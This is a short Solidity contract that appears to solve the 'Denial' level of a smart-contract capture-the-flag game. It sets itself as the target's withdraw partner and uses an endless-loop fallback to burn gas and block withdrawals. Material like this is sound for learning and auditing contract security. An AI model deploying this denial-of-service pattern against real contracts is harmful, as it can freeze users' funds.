// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Denial} from "../instances/Ilevel20.sol";

contract Partner {
    constructor(address payable target) {
        Denial(target).setWithdrawPartner(address(this));
    }

    fallback() external payable {
        while (true) {}
    }
}
